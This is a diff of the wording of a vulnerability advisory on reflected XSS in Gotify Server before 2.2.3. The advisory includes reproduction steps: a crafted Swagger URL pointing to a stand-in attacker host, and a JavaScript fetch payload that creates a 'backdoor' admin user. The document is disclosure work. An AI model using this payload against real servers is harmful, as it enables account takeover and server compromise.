@@ -25,15 +25,13 @@ Until [v2.2.3](https://github.com/gotify/server/pull/541), the Swagger UI versio
 <script src="https://cdnjs.cloudflare.com/ajax/libs/swagger-ui/3.20.5/swagger-ui-standalone-preset.js"></script>
 ```
 
-Gotify Server versions before 2.2.3 are thus susceptible to reflected XSS attacks when loading external Swagger config files with the `url` query string parameter.
-
-Since Gotify stores the logged-in user's auth token in localStorage and accepts it via the `X-Gotify-Key` header, this reflected XSS can result in the compromise of logged-in administrative users' accounts (and consequently the Gotify server) if they browse to a crafted URL on that server.
+Gotify Server versions before 2.2.3 are thus susceptible to reflected XSS attacks when loading external Swagger config files via the `url` query string parameter. Since Gotify stores the logged-in user's auth token in localStorage and accepts it via the `X-Gotify-Key` header, reflected XSS can result in the compromise of logged-in administrative users' accounts if they browse to a crafted URL.
 
 ## Steps to Reproduce
 
 1. Use the official [Docker Compose file](https://gotify.net/docs/install#docker) or [example config file](https://raw.githubusercontent.com/gotify/server/v2.2.2/config.example.yml) to bring up an instance of Gotify Server (herein `https://gotify`) and log in with the admin credentials defined in the `defaultuser` block.
 
-2. Host the Swagger YAML file included at the end of this section at a location that you control (herein `http://attacker/swagger.yaml`). This file is based on the one provided by Vidoc Security[^2] but minified and including the following JavaScript payload Base64-encoded:
+2. Host the [Swagger YAML file](#swagger-yaml-file) at a location that you control (herein `https://attacker/swagger.yaml`). This file is based on the one provided by Vidoc Security[^2] but has been minified and adjusted to include the following JavaScript encoded to Base64:
 
 ```javascript
 fetch(window.location.origin + "/user", {
@@ -50,9 +48,9 @@ fetch(window.location.origin + "/user", {
 });
 ```
 
-3. Browse to https://gotify/docs?url=https://attacker/swagger.yaml, then browse to https://gotify/#/users and observe that a new admin user with the name `backdoor` has been added to your Gotify Server instance:
+3. Browse to https://gotify/docs?url=https://attacker/swagger.yaml, then browse to https://gotify/#/users and observe that a new admin user with the name `backdoor` has been added:
 
-![Gotify Server Web UI showing the 'backdoor' user demonstrating successful reproduction of the issue](images/1.png)
+![Gotify Server Web UI showing the 'backdoor' user demonstrating a successful reproduction of the issue](images/1.png)
 
 ### Swagger YAML file
 
@@ -67,7 +65,7 @@ basePath: /poc
 
 ## Impact
 
-An attacker can execute arbitrary JavaScript in the context of a logged-in user who browses to a crafted URL on their Gotify server and gain administrative access to the Web UI if the server is reachable and the victim was an administrator.
+An attacker can execute arbitrary JavaScript in the context of a logged-in Gotify user who browses to a crafted URL and use this to gain administrative access to the Gotify Web UI if it is reachable and the victim was an administrator.
 
 ## Timeline
 
